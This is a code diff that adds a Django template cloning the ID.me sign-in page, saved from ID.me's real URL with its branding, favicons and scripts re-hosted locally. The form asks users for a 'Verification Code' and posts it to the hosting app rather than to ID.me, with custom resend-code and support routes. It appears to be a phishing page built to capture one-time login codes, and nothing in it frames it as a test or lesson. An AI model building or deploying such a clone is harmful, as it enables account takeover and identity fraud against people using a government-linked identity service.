@@ -1,0 +1,198 @@
+{% load static %}
+{% load crispy_forms_tags %}
+
+<!DOCTYPE html>
+<!-- saved from url=(0032)https://api.id.me/en/session/new -->
+<html dir="ltr" lang="en">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+      <style>
+        body {transition: opacity ease-in 0.2s; }
+        body[unresolved] {opacity: 0; display: block; overflow: hidden; position: relative; }
+      </style>
+      <link href="https://static.queue-it.net/" rel="preconnect">
+      <link href="https://api.sjpf.io/" rel="preconnect">
+      <link href="https://device.id.me/" rel="preconnect">
+    <title> Verification - ID.me </title>
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="One Identity. One Wallet." name="description">
+    <meta content="" name="keywords">
+    <meta content="noodp" name="robots">
+    <meta content="width=device-width, initial-scale=1, minimum-scale=1" name="viewport">
+    <meta content="noindex" name="robots">
+    <link rel="icon" type="image/png" href="https://api.id.me/assets/icons/favicon/favicon-3b57957bde0ba341f2e080013aa6d42d303e29a4594c8f231c013514b22241f0.ico">
+    <link rel="apple-touch-icon-precomposed" type="image/x-icon" href="https://api.id.me/assets/icons/favicon/apple-icon-57x57-ad49f33c6b98bd9390e51e5ac97408cd19da3764e931bc19b252fea34fc9ee94.png" sizes="57x57">
+    <link rel="apple-touch-icon-precomposed" type="image/x-icon" href="https://api.id.me/assets/icons/favicon/apple-icon-60x60-85a8ae744189245feb30a76d00ba698d3e76947c3510def7c8888a761fbd63ba.png" sizes="60x60">
+    <link rel="apple-touch-icon-precomposed" type="image/x-icon" href="https://api.id.me/assets/icons/favicon/apple-icon-72x72-43f9b13ee585ccdf6454f716226fab557042a37f8ac0ec6a894f6459b815862e.png" sizes="72x72">
+    <link rel="apple-touch-icon-precomposed" type="image/x-icon" href="https://api.id.me/assets/icons/favicon/apple-icon-76x76-d4854442eb3222a5e97fea96e8f83a519c2c7ea1282f10f32a2f5836019edba4.png" sizes="76x76">
+    <link rel="apple-touch-icon-precomposed" type="image/x-icon" href="https://api.id.me/assets/icons/favicon/apple-icon-114x114-71fe1cbcccd25bcd53daf343da695eda01adadfdef93b074c33a24584ae127c2.png" sizes="114x114">
+    <link rel="apple-touch-icon-precomposed" type="image/x-icon" href="https://api.id.me/assets/icons/favicon/apple-icon-120x120-4e224a98384c32a9df5e683186aaf80f5dc38df03df317f420c764e5be488480.png" sizes="120x120">
+    <link rel="apple-touch-icon-precomposed" type="image/x-icon" href="https://api.id.me/assets/icons/favicon/apple-icon-144x144-b7e0aeb0a26dcb5bd1aebb4eaf37f98251fc34fb40e0b441f771372b94fa66ee.png" sizes="144x144">
+    <link rel="apple-touch-icon-precomposed" type="image/x-icon" href="https://api.id.me/assets/icons/favicon/apple-icon-152x152-edbdf8cbb18f90bd8eb093cc6150fcc53d02e1636a4d3b76fbe1bc0ba5baab82.png" sizes="152x152">
+    <link rel="apple-touch-icon-precomposed" type="image/x-icon" href="https://api.id.me/assets/icons/favicon/apple-icon-180x180-117122c85f63d210955a29669d6b5b4319cc7340e558efe668f4594d1d7304b9.png" sizes="180x180">
+    <link rel="apple-touch-icon-precomposed" type="image/x-icon" href="https://api.id.me/assets/icons/favicon/apple-icon-precomposed-9dcfe3e20a36782b710958768d9a4c5463b0ced00f869ce015cf38c879f79830.png">
+    <link rel="icon" type="image/png" href="https://api.id.me/assets/icons/favicon/android-icon-192x192-b9cca81c421fd74056c944fd87457ea8b76efec91549bfd5baa639e362316d93.png" sizes="192x192">
+    <link rel="icon" type="image/png" href="https://api.id.me/assets/icons/favicon/favicon-32x32-88474466ed084a8ad0cab7ddd9b1711a8b96e09d9fbeb769a1d3be9d5c728fa7.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="https://api.id.me/assets/icons/favicon/favicon-96x96-ff4bc49c45218d94bd24dce580e30118e266d76cd408c36d575b997b0aaf53e3.png" sizes="96x96">
+    <link rel="icon" type="image/png" href="https://api.id.me/assets/icons/favicon/favicon-16x16-5a8c92dd3dbf20296d619eb084a3ea9510fb77312e80835985fed7fd1d21e15d.png" sizes="16x16">
+    <script type="text/javascript" src="{% static 'frontend/idme/1695222521686' %}" async=""></script>
+    <script type="text/javascript" async="" src="{% static 'frontend/idme/js' %}"></script>
+    <script async="" charset="utf-8" src="{% static 'frontend/idme/asset_composer.js.download' %}" type="text/javascript"></script>
+    <script async="" src="{% static 'frontend/idme/gtm.js.download' %}"></script>
+    <script async="" src="{% static 'frontend/idme/analytics.js.download' %}"></script>
+    <script>
+      window._qUUID =      "userless";
+      window._qSESSIONID = "b6a3614276208bfe3dac473201295205";
+      window._qINTID =     "3699";
+      window._qINT =       "ID.me My Account";
+    </script>
+    <script>
+      window._sf_startpt = (new Date()).getTime();
+      window.settings = {
+
+        google : {
+          account : "UA-40672673-1",
+          linking : "true"
+        },
+
+        gtm_engineering: "GTM-PL62HD9",
+
+        zendesk_chat: {
+          key: "22fb9205-0748-40d7-8eb1-c964afe88d06"
+        },
+
+        qualtrics: {
+          zoneId: "ZN_2bLc7fWaOZ8U4ey"
+        }
+      };
+    </script>
+    <script>
+      window.QUEUE_IDENTIFIER = 3699;
+    </script>
+
+    <script>
+      window.locales = {
+        "current" : "en",
+        "default" : "en"
+      };
+    </script>
+
+    <script src="{% static 'frontend/idme/device-f88e909eace50b502367ac8aebc51ed9267c82f1c4609c91db9e995bc768bffc.js.download' %}" id="device-loader"></script>
+
+    <script src="{% static 'frontend/idme/google-81990243df62fe63ea10e1b61505d86bdd0b9507c3b841c224bd25981a95c8aa.js.download' %}"></script>
+    <script src="{% static 'frontend/idme/gtm_engineering-75cb54582c7329f991049ae3b2e8de9ade91f84253bb7026330dfb172ff4de40.js.download' %}"></script>
+    <script src="{% static 'frontend/idme/runtime-5d83b91d2172c6417e29.js.download' %}"></script>
+    <script src="{% static 'frontend/idme/725-51e18ddddea6f1a98a88.js.download' %}"></script>
+    <script src="{% static 'frontend/idme/polyfills-b73a7b909378b44c462f.js.download' %}"></script>
+    <script src="{% static 'frontend/idme/988-80c2f60fff4d3f5a13e8.js.download' %}"></script>
+    <script src="{% static 'frontend/idme/components-fc600bef79474ac75c67.js.download' %}"></script>
+    <script src="{% static 'frontend/idme/queueclient.min.js.download' %}"></script>
+    <script src="{% static 'frontend/idme/queueconfigloader.min.js.download' %}" data-queueit-c="frontend/idme"></script>
+    <script type="text/javascript" src="{% static 'frontend/idme/queueclientConfig.js.download' %}"></script>
+    <meta name="csrf-param" content="authenticity_token">
+    <meta name="csrf-token" content="TVCOfExlbkhLjr+qgaQruekFER9DpLAO93kjKYCkuZTyQJp20fVV8tsPFVHZkhQeLVogyNMSqaN2J3nLRz8+1w==">
+    <link rel="stylesheet" media="all" href="{% static 'frontend/idme/application-4a0b7b0d263d32df24730ee97ea6b5d903415cee58a98f8c50b810771c34dcef.css' %}">
+
+    <script>
+      ga("require", "linker");
+      ga("linker:autoLink", ["va.gov", "id.me", "myaccess.dmdc.osd.mil"], false, true);
+    </script>
+
+    <script>
+      !function(e){var n="https://s.go-mpulse.net/boomerang/";if("False"=="True")e.BOOMR_config=e.BOOMR_config||{},e.BOOMR_config.PageParams=e.BOOMR_config.PageParams||{},e.BOOMR_config.PageParams.pci=!0,n="https://s2.go-mpulse.net/boomerang/";if(window.BOOMR_API_key="GTDQ2-YPV4D-ZPN8M-VW3LM-H9A7G",function(){function e(){if(!o){var e=document.createElement("script");e.id="boomr-scr-as",e.src=window.BOOMR.url,e.async=!0,i.parentNode.appendChild(e),o=!0}}function t(e){o=!0;var n,t,a,r,d=document,O=window;if(window.BOOMR.snippetMethod=e?"if":"i",t=function(e,n){var t=d.createElement("script");t.id=n||"boomr-if-as",t.src=window.BOOMR.url,BOOMR_lstart=(new Date).getTime(),e=e||d.body,e.appendChild(t)},!window.addEventListener&&window.attachEvent&&navigator.userAgent.match(/MSIE [67]\./))return window.BOOMR.snippetMethod="s",void t(i.parentNode,"boomr-async");a=document.createElement("IFRAME"),a.src="about:blank",a.title="",a.role="presentation",a.loading="eager",r=(a.frameElement||a).style,r.width=0,r.height=0,r.border=0,r.display="none",i.parentNode.appendChild(a);try{O=a.contentWindow,d=O.document.open()}catch(_){n=document.domain,a.src="javascript:var d=document.open();d.domain='"+n+"';void(0);",O=a.contentWindow,d=O.document.open()}if(n)d._boomrl=function(){this.domain=n,t()},d.write("<bo"+"dy onload='document._boomrl();'>");else if(O._boomrl=function(){t()},O.addEventListener)O.addEventListener("load",O._boomrl,!1);else if(O.attachEvent)O.attachEvent("onload",O._boomrl);d.close()}function a(e){window.BOOMR_onload=e&&e.timeStamp||(new Date).getTime()}if(!window.BOOMR||!window.BOOMR.version&&!window.BOOMR.snippetExecuted){window.BOOMR=window.BOOMR||{},window.BOOMR.snippetStart=(new Date).getTime(),window.BOOMR.snippetExecuted=!0,window.BOOMR.snippetVersion=12,window.BOOMR.url=n+"GTDQ2-YPV4D-ZPN8M-VW3LM-H9A7G";var i=document.currentScript||document.getElementsByTagName("script")[0],o=!1,r=document.createElement("link");if(r.relList&&"function"==typeof r.relList.supports&&r.relList.supports("preload")&&"as"in r)window.BOOMR.snippetMethod="p",r.href=window.BOOMR.url,r.rel="preload",r.as="script",r.addEventListener("load",e),r.addEventListener("error",function(){t(!0)}),setTimeout(function(){if(!o)t(!0)},3e3),BOOMR_lstart=(new Date).getTime(),i.parentNode.appendChild(r);else t(!1);if(window.addEventListener)window.addEventListener("load",a,!1);else if(window.attachEvent)window.attachEvent("onload",a)}}(),"".length>0)if(e&&"performance"in e&&e.performance&&"function"==typeof e.performance.setResourceTimingBufferSize)e.performance.setResourceTimingBufferSize();!function(){if(BOOMR=e.BOOMR||{},BOOMR.plugins=BOOMR.plugins||{},!BOOMR.plugins.AK){var n=""=="true"?1:0,t="",a="yj2nakk4pnttqzilbl3q-f-19a5cce01-clientnsv4-s.akamaihd.net",i="false"=="true"?2:1,o={"ak.v":"36","ak.cp":"1252485","ak.ai":parseInt("752192",10),"ak.ol":"0","ak.cr":59,"ak.ipv":4,"ak.proto":"h2","ak.rid":"ed9fe78d","ak.r":45172,"ak.a2":n,"ak.m":"dscb","ak.n":"essl","ak.bpcip":"194.116.208.0","ak.cport":33863,"ak.gh":"92.123.103.52","ak.quicv":"","ak.tlsv":"tls1.3","ak.0rtt":"","ak.csrc":"-","ak.acc":"","ak.t":"1695222519","ak.ak":"hOBiQwZUYzCg5VSAfCLimQ==uaAp8lQkh/u+/VQsScGL/Rx180pHJXQbJprDm8QBVwrCX4ds9jCl7IK3hlK1q6puw9nQlGFxXsNsVACZQ3IzKHnuMxp1XlQJAuG0bQxu42Fgw3VHNJJti9xt868MuRICsUC1xj41UyXL+Qwe15sapL2fJ1QTVEOZdOP1wC+ZycGKg3vM8aKVA/EeU9PrCv2244orl/Qur6kKVd9dtAP3fwL9/ZkGk/QX2Hs2jZ9++eRJX2/LpKgVROq1sPrZabDz+VD8O+vvTztpu/Dsef39A8uSs5B1/jf4IAuytShBNrgQHBJekyIgWJdhS19yf6nv1H7YJ7vkKfgqO1q9W08jSBjQjeizhfaNrncwQKQIvRFi2gCtGgbjo4J5Nnv9dwAj/h7T06iv4ubELJ0ht+3QESVD/dAJO1MU50S5xSWEkgw=","ak.pv":"196","ak.dpoabenc":"","ak.tf":i};if(""!==t)o["ak.ruds"]=t;var r={i:!1,av:function(n){var t="http.initiator";if(n&&(!n[t]||"spa_hard"===n[t]))o["ak.feo"]=void 0!==e.aFeoApplied?1:0,BOOMR.addVar(o)},rv:function(){var e=["ak.bpcip","ak.cport","ak.cr","ak.csrc","ak.gh","ak.ipv","ak.m","ak.n","ak.ol","ak.proto","ak.quicv","ak.tlsv","ak.0rtt","ak.r","ak.acc","ak.t","ak.tf"];BOOMR.removeVar(e)}};BOOMR.plugins.AK={akVars:o,akDNSPreFetchDomain:a,init:function(){if(!r.i){var e=BOOMR.subscribe;e("before_beacon",r.av,null,null),e("onbeacon",r.rv,null,null),r.i=!0}return this},is_complete:function(){return!0}}}}()}(window);
+    </script>
+
+    <link href="{% static 'frontend/idme/GTDQ2-YPV4D-ZPN8M-VW3LM-H9A7G'%}" rel="preload" as="script">
+    <script id="boomr-scr-as" src="{% static 'frontend/idme/GTDQ2-YPV4D-ZPN8M-VW3LM-H9A7G'%}" async=""></script>
+    <script charset="utf-8" src="{% static 'frontend/idme/11.ae63b0c5e76f2df607a5.chunk.js.download'%}"></script>
+    <script type="text/javascript" charset="UTF-8" src="{% static 'frontend/idme/common.js.download'%}"></script>
+    <script type="text/javascript" charset="UTF-8" src="{% static 'frontend/idme/util.js.download'%}"></script>
+
+  </head>
+  <body class="" data-new-gr-c-s-check-loaded="14.1125.0" data-gr-ext-installed="">
+    <div id="ZN_2bLc7fWaOZ8U4ey"></div>
+      <div class="page-container" data-role="page-container">
+        <div class="container">
+          <div class="content-container">
+            <form class="new_user" id="new_user" data-validate="signin" accept-charset="UTF-8" method="post" novalidate="novalidate">
+              {% csrf_token %}
+              <div class="form-header">
+                <div class="form-header-content" role="banner">
+                  <div class="partner">
+                    <div class="c_icon m_frontend/idme">
+                      <img alt="ID.me" src="{% static 'frontend/idme/logo.png' %}" width="300">
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <main aria-labelledby="sr_page_title" class="form-container">
+                <div class="form-header-access">
+                  <h1 id="sr_page_title">Sign in to ID.me</h1>
+                </div>
+                <div class="form-header-well">
+                  <p>New to ID.me?</p>
+                  <p><a href="https://api.id.me/en/registration/new">Create an ID.me account</a></p>
+                  {% include 'frontend/idme/messages.html' %}
+                </div>
+
+                <p class="alert alert-error" role="alert" style=""></p>
+                <p class="alert alert-success" role="alert" style=""></p>
+
+                <div class="form-fields">
+                  <div class="field-group">
+
+                    <div class="field text">
+                      <label for="user_email">Verification Code</label>
+                      <input placeholder="Enter code" required="required" autocomplete="email" type="text" name="code" id="user_email">
+                      <span role="alert"></span>
+                    </div>
+                    <p> <a href="{% url 'auth:resend_code_verification' uidb64 %}">resend code</a> </p>
+
+                  </div>
+                </div>
+                <div class="form-actions">
+                  <input type="submit" name="commit" value="Sign in" class="btn btn-primary" data-disable-with="Signing in to ID.me..." data-clicked="false">
+                </div>
+                <div class="form-footer">
+                  <div class="form-header-well">
+                    <p>Unable to login?</p>
+                    <a href="{% url 'auth:contact_support' uidb64 %}">contact support</a>
+                  </div>
+                </div>
+              </main>
+            </form>
+          </div>
+
+          <footer class="footer">
+            <nav aria-label="Footer" class="footer__links">
+              <ul class="footer__list">
+              <li class="footer__list-item"><a target="_blank" class="footer__link" href="https://www.id.me/about">What is ID.me?</a></li>
+              <li class="footer__list-item"><a target="_blank" class="footer__link" href="https://www.id.me/terms">Terms of Service</a></li>
+              <li class="footer__list-item"><a target="_blank" class="footer__link" href="https://www.id.me/privacy">Privacy Policy</a></li>
+              </ul>
+            </nav>
+          </footer>
+        </div>
+      </div>
+    <script src="{% static 'frontend/idme/js(1)' %}"></script>
+    <script src="{% static 'frontend/idme/application-e810d31e1255e4f5f5c1e3df714f6459fcdd28af72694d73c97338a47ff009d2.js.download' %}"></script>
+    <script src="{% static 'frontend/idme/chat-277e743ae9574a31927fbdf43530b414d8e8480f369965cec738a2a93d3e0311.js.download' %}"></script>
+    <script type="text/javascript" src="% static 'frontend/idme/eE1YB' %}"></script>
+
+    <img src="{% static 'frontend/idme/resource.png' %}" style="display: none;">
+    <iframe data-product="web_widget" title="No content" role="presentation" tabindex="-1" allow="microphone *" aria-hidden="true" src="% static 'frontend/idme/saved_resource.html" style="width: 0px; height: 0px; border: 0px; position: absolute; top: -9999px;"></iframe>
+    <script>
+      window.setTimeout(function() {
+          $(".alerted").fadeTo(500, 0).slideUp(500, function(){
+              $(this).remove();
+          });
+
+          $("#remove").fadeTo(500, 0).slideUp(500, function(){
+              $(this).remove();
+          });
+
+      }, 10000);
+
+  </script>
+  </body>
+</html>
